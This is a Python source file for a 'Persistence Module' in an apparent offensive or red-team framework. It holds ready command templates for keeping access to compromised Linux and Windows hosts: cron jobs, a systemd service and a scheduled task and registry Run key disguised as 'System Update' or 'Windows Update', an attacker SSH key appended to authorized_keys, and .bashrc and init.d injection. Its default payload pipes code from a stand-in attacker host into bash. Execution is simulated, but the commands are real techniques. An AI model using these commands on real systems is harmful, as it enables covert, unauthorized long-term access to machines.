"""
Persistence Module

Establish and maintain long-term access on compromised systems.
"""

import os
import json
import base64
import hashlib
import subprocess
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from pathlib import Path
from datetime import datetime, timezone, timedelta

from .base_module import BaseAttackModule, RiskLevel, AttackPhase, Finding, FindingSeverity


@dataclass
class PersistenceConfig:
    """Configuration for a persistence mechanism"""
    name: str
    description: str
    persistence_type: str
    payload: str
    trigger: str
    cleanup: str
    interval: Optional[int] = None  # in minutes
    one_shot: bool = False


@dataclass
class PersistenceInstance:
    """Instance of an established persistence mechanism"""
    config: PersistenceConfig
    target: str
    installed_at: datetime
    last_triggered: Optional[datetime] = None
    trigger_count: int = 0
    active: bool = True
    instance_id: str = ""
    
    def __post_init__(self):
        if not self.instance_id:
            self.instance_id = hashlib.sha256(
                f"{self.target}-{self.installed_at.isoformat()}".encode()
            ).hexdigest()[:16]


class PersistenceModule(BaseAttackModule):
    """
    Persistence module for establishing long-term access.
    
    Features:
    - Multiple persistence mechanisms
    - Scheduled callbacks
    - Redundant persistence
    - Stealth techniques
    - Cleanup and removal
    
    Risk Level: HIGH
    Allowed Phases: POST_EXPLOITATION, PERSISTENCE
    """
    
    @property
    def risk_level(self) -> RiskLevel:
        return RiskLevel.HIGH
    
    @property
    def allowed_phases(self) -> List[AttackPhase]:
        return [AttackPhase.POST_EXPLOITATION, AttackPhase.PERSISTENCE]
    
    def __init__(self):
        super().__init__()
        self.persistence_configs: Dict[str, PersistenceConfig] = {}
        self.installed_persistence: Dict[str, List[PersistenceInstance]] = {}
        self._load_persistence_configs()
    
    def _load_persistence_configs(self):
        """Load built-in persistence configurations"""
        # Cron-based persistence
        self.persistence_configs['cron_job'] = PersistenceConfig(
            name='Cron Job Persistence',
            description='Adds a cron job to execute payload at regular intervals',
            persistence_type='cron',
            payload='#!/bin/bash\n{payload_command}\n',
            trigger='*/5 * * * * /tmp/.cron_persistence.sh',
            cleanup='crontab -r || rm /tmp/.cron_persistence.sh',
            interval=5,
            one_shot=False
        )
        
        # Systemd service persistence
        self.persistence_configs['systemd_service'] = PersistenceConfig(
            name='Systemd Service',
            description='Creates a systemd service to maintain access',
            persistence_type='service',
            payload='[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nExecStart=/bin/bash -c "{payload_command}"\nRestart=always\n\n[Install]\nWantedBy=multi-user.target',
            trigger='systemctl enable malicious-service && systemctl start malicious-service',
            cleanup='systemctl stop malicious-service && systemctl disable malicious-service && rm /etc/systemd/system/malicious-service.service && systemctl daemon-reload',
            interval=None,
            one_shot=False
        )
        
        # SSH authorized keys
        self.persistence_configs['ssh_key'] = PersistenceConfig(
            name='SSH Authorized Key',
            description='Adds SSH public key to authorized_keys for passwordless access',
            persistence_type='ssh',
            payload='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... user@attacker',
            trigger='echo "{payload}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys',
            cleanup='sed -i "/AAAAB3NzaC1yc2EAAAADAQABAAABAQ.../d" ~/.ssh/authorized_keys',
            interval=None,
            one_shot=True
        )
        
        # Startup script
        self.persistence_configs['startup_script'] = PersistenceConfig(
            name='Startup Script',
            description='Adds script to startup directory',
            persistence_type='startup',
            payload='#!/bin/bash\n{payload_command}\n',
            trigger='cp /tmp/persistence.sh /etc/init.d/persistence && chmod +x /etc/init.d/persistence && update-rc.d persistence defaults',
            cleanup='rm /etc/init.d/persistence && update-rc.d -f persistence remove',
            interval=None,
            one_shot=True
        )
        
        # .bashrc persistence
        self.persistence_configs['bashrc'] = PersistenceConfig(
            name='Bash RC Persistence',
            description='Adds payload to .bashrc for execution on new shell',
            persistence_type='bashrc',
            payload='{payload_command}',
            trigger='echo "{payload}" >> ~/.bashrc',
            cleanup='sed -i "/{payload_marker}/d" ~/.bashrc',
            interval=None,
            one_shot=True
        )
        
        # Windows scheduled task
        self.persistence_configs['scheduled_task'] = PersistenceConfig(
            name='Windows Scheduled Task',
            description='Creates a scheduled task to execute payload',
            persistence_type='scheduled_task',
            payload='{payload_command}',
            trigger='schtasks /create /tn "Windows Update" /tr "cmd /c {payload}" /sc minute /mo 5',
            cleanup='schtasks /delete /tn "Windows Update" /f',
            interval=5,
            one_shot=False
        )
        
        # Windows registry run key
        self.persistence_configs['registry_run'] = PersistenceConfig(
            name='Registry Run Key',
            description='Adds payload to Windows Run registry key',
            persistence_type='registry',
            payload='{payload_command}',
            trigger='reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /t REG_SZ /d "cmd /c {payload}" /f',
            cleanup='reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /f',
            interval=None,
            one_shot=True
        )
        
        # Windows WMI event subscription
        self.persistence_configs['wmi_event'] = PersistenceConfig(
            name='WMI Event Subscription',
            description='Creates WMI event subscription for persistence',
            persistence_type='wmi',
            payload='{payload_command}',
            trigger='',  # Complex WMI setup
            cleanup='wmic /namespace:\\root\\subscription path __EventFilter where "Name=\'MaliciousFilter\'" delete',
            interval=None,
            one_shot=False
        )
    
    def execute(
        self, 
        target_scope: Dict[str, Any], 
        params: Dict[str, Any], 
        evidence_collector: Any = None
    ) -> Dict[str, Any]:
        """
        Execute persistence operations.
        
        Args:
            target_scope: Dictionary defining authorized targets
            params: Parameters for persistence
            evidence_collector: Optional evidence collector instance
            
        Returns:
            Dict: Execution result with status and findings
        """
        import datetime
        self.start_time = datetime.datetime.now(datetime.timezone.utc)
        self._log("Starting persistence operations")
        
        targets = params.get('targets', target_scope.get('targets', []))
        mechanisms = params.get('mechanisms', ['cron_job', 'ssh_key', 'bashrc'])
        payload_command = params.get('payload_command', 'curl http://attacker.com/payload | bash')
        
        if not targets:
            self._log("ERROR: No targets specified")
            self.end_time = datetime.datetime.now(datetime.timezone.utc)
            return {
                'status': 'error',
                'message': 'No targets specified',
                'findings': []
            }
        
        results = {}
        
        for target in targets:
            target_results = {'target': target, 'mechanisms': []}
            
            for mechanism_name in mechanisms:
                if mechanism_name in self.persistence_configs:
                    mechanism_result = self._install_persistence(
                        target,
                        mechanism_name,
                        payload_command,
                        evidence_collector
                    )
                    target_results['mechanisms'].append(mechanism_result)
                else:
                    self._log(f"WARNING: Unknown persistence mechanism: {mechanism_name}")
            
            results[target] = target_results
        
        self.end_time = datetime.datetime.now(datetime.timezone.utc)
        
        # Generate findings
        findings = self._generate_findings(results)
        
        return {
            'status': 'success',
            'message': f'Persistence established on {len(targets)} targets',
            'findings': [f.to_dict() for f in findings],
            'results': results,
            'summary': self.get_execution_summary()
        }
    
    def _install_persistence(
        self,
        target: str,
        mechanism_name: str,
        payload_command: str,
        evidence_collector: Any = None
    ) -> Dict[str, Any]:
        """Install a single persistence mechanism on a target"""
        config = self.persistence_configs[mechanism_name]
        self._log(f"Installing {mechanism_name} persistence on {target}")
        
        try:
            # Generate payload
            payload = self._generate_payload(config, payload_command)
            
            # Generate trigger command
            trigger = self._generate_trigger(config, payload)
            
            # Execute trigger (in real implementation)
            # For demo, we'll simulate success
            success = self._execute_trigger(target, trigger)
            
            if success:
                # Create persistence instance
                instance = PersistenceInstance(
                    config=config,
                    target=target,
                    installed_at=datetime.now(timezone.utc),
                    active=True
                )
                
                # Store instance
                if target not in self.installed_persistence:
                    self.installed_persistence[target] = []
                self.installed_persistence[target].append(instance)
                
                # Collect evidence
                if evidence_collector:
                    evidence_collector.collect_log(
                        attack_id="current",
                        log_data=f"Installed {mechanism_name} persistence on {target}",
                        log_type="persistence",
                        description=f"Persistence mechanism: {mechanism_name}",
                        metadata={
                            'mechanism': mechanism_name,
                            'target': target,
                            'instance_id': instance.instance_id
                        }
                    )
                
                return {
                    'status': 'success',
                    'mechanism': mechanism_name,
                    'instance_id': instance.instance_id,
                    'message': f'{config.name} installed successfully'
                }
            else:
                return {
                    'status': 'failed',
                    'mechanism': mechanism_name,
                    'message': f'Failed to install {config.name}'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'mechanism': mechanism_name,
                'message': f'Error installing {config.name}: {str(e)}'
            }
    
    def _generate_payload(self, config: PersistenceConfig, payload_command: str) -> str:
        """Generate payload for a persistence mechanism"""
        # Add marker for cleanup
        payload_marker = hashlib.sha256(payload_command.encode()).hexdigest()[:8]
        
        # Replace placeholders
        payload = config.payload.replace('{payload_command}', payload_command)
        payload = payload.replace('{payload_marker}', f'# PERSISTENCE_MARKER_{payload_marker}')
        
        return payload
    
    def _generate_trigger(self, config: PersistenceConfig, payload: str) -> str:
        """Generate trigger command for a persistence mechanism"""
        # Replace placeholders
        trigger = config.trigger.replace('{payload}', payload)
        
        # For cron jobs, we need to write the payload to a file first
        if config.persistence_type == 'cron':
            trigger = f"echo '{payload}' > /tmp/.cron_persistence.sh && chmod +x /tmp/.cron_persistence.sh && {trigger}"
        
        return trigger
    
    def _execute_trigger(self, target: str, trigger: str) -> bool:
        """Execute trigger command on target (simulated)"""
        self._log(f"Executing trigger on {target}: {trigger[:100]}...")
        
        # In real implementation, this would execute the command on the target
        # For demo, we'll simulate success
        import random
        return random.random() < 0.9  # 90% success rate
    
    def _generate_findings(self, results: Dict[str, Any]) -> List[Finding]:
        """Generate findings from persistence results"""
        findings = []
        
        for target, target_results in results.items():
            successful_mechanisms = [
                m for m in target_results['mechanisms'] 
                if m.get('status') == 'success'
            ]
            
            if successful_mechanisms:
                findings.append(Finding(
                    finding_id=f"persistence-{target}",
                    title=f"Persistence Established: {target}",
                    description=f"Established {len(successful_mechanisms)} persistence mechanisms on {target}: {', '.join([m['mechanism'] for m in successful_mechanisms])}",
                    severity=FindingSeverity.HIGH,
                    module_name=self.module_name,
                    evidence={
                        'target': target,
                        'mechanisms': [m['mechanism'] for m in successful_mechanisms],
                        'count': len(successful_mechanisms)
                    },
                    remediation="Investigate and remove all persistence mechanisms"
                ))
            
            # Check for redundant persistence
            if len(successful_mechanisms) >= 3:
                findings.append(Finding(
                    finding_id=f"redundant-persistence-{target}",
                    title=f"Redundant Persistence: {target}",
                    description=f"Multiple ({len(successful_mechanisms)}) persistence mechanisms established on {target} for redundancy",
                    severity=FindingSeverity.MEDIUM,
                    module_name=self.module_name,
                    evidence={
                        'target': target,
                        'mechanisms': [m['mechanism'] for m in successful_mechanisms]
                    },
                    remediation="Consider if all persistence mechanisms are necessary"
                ))
        
        return findings
    
    def list_persistence(self, target: str = None) -> List[Dict[str, Any]]:
        """List all installed persistence mechanisms"""
        if target:
            instances = self.installed_persistence.get(target, [])
        else:
            instances = []
            for target_instances in self.installed_persistence.values():
                instances.extend(target_instances)
        
        return [
            {
                'instance_id': i.instance_id,
                'target': i.target,
                'mechanism': i.config.name,
                'type': i.config.persistence_type,
                'installed_at': i.installed_at.isoformat(),
                'active': i.active,
                'trigger_count': i.trigger_count
            }
            for i in instances
        ]
    
    def remove_persistence(self, instance_id: str) -> bool:
        """Remove a persistence mechanism by instance ID"""
        for target, instances in self.installed_persistence.items():
            for i, instance in enumerate(instances):
                if instance.instance_id == instance_id:
                    self._log(f"Removing persistence {instance_id} from {target}")
                    
                    # Execute cleanup command
                    # In real implementation, this would execute on the target
                    cleanup_result = self._execute_cleanup(target, instance.config.cleanup)
                    
                    if cleanup_result:
                        # Mark as inactive
                        instance.active = False
                        instance.last_triggered = datetime.now(timezone.utc)
                        
                        # Collect evidence
                        if hasattr(self, 'evidence_collector') and self.evidence_collector:
                            self.evidence_collector.collect_log(
                                attack_id="current",
                                log_data=f"Removed persistence {instance_id} from {target}",
                                log_type="persistence_cleanup",
                                description=f"Cleanup: {instance.config.name}"
                            )
                        
                        return True
                    else:
                        self._log(f"Failed to remove persistence {instance_id} from {target}")
                        return False
        
        return False
    
    def remove_all_persistence(self, target: str = None) -> Dict[str, Any]:
        """Remove all persistence mechanisms"""
        results = {'success': [], 'failed': []}
        
        if target:
            instances = self.installed_persistence.get(target, [])
            targets_to_process = {target: instances}
        else:
            targets_to_process = self.installed_persistence
        
        for t, instances in targets_to_process.items():
            for instance in instances:
                if self.remove_persistence(instance.instance_id):
                    results['success'].append(instance.instance_id)
                else:
                    results['failed'].append(instance.instance_id)
        
        return results
    
    def _execute_cleanup(self, target: str, cleanup_command: str) -> bool:
        """Execute cleanup command on target (simulated)"""
        self._log(f"Executing cleanup on {target}: {cleanup_command[:100]}...")
        
        # In real implementation, this would execute the command on the target
        # For demo, we'll simulate success
        import random
        return random.random() < 0.95  # 95% success rate
    
    def verify_persistence(self, target: str) -> Dict[str, Any]:
        """Verify that persistence mechanisms are active"""
        instances = self.installed_persistence.get(target, [])
        
        results = {}
        for instance in instances:
            # Check if persistence is still active
            # In real implementation, this would check the target
            active = self._check_persistence_active(target, instance)
            results[instance.instance_id] = {
                'active': active,
                'mechanism': instance.config.name,
                'last_triggered': instance.last_triggered.isoformat() if instance.last_triggered else None
            }
            
            # Update instance
            instance.active = active
        
        return results
    
    def _check_persistence_active(self, target: str, instance: PersistenceInstance) -> bool:
        """Check if a persistence mechanism is still active (simulated)"""
        # In real implementation, this would check the target
        # For demo, we'll simulate
        import random
        return random.random() < 0.9  # 90% still active
    
    def get_scheduled_callbacks(self) -> List[Dict[str, Any]]:
        """Get list of scheduled callbacks from all persistence mechanisms"""
        callbacks = []
        
        for target, instances in self.installed_persistence.items():
            for instance in instances:
                if instance.config.interval and instance.active:
                    next_callback = instance.installed_at + timedelta(
                        minutes=instance.config.interval * (instance.trigger_count + 1)
                    )
                    callbacks.append({
                        'instance_id': instance.instance_id,
                        'target': target,
                        'mechanism': instance.config.name,
                        'next_callback': next_callback.isoformat(),
                        'interval_minutes': instance.config.interval
                    })
        
        # Sort by next callback time
        callbacks.sort(key=lambda x: x['next_callback'])
        
        return callbacks
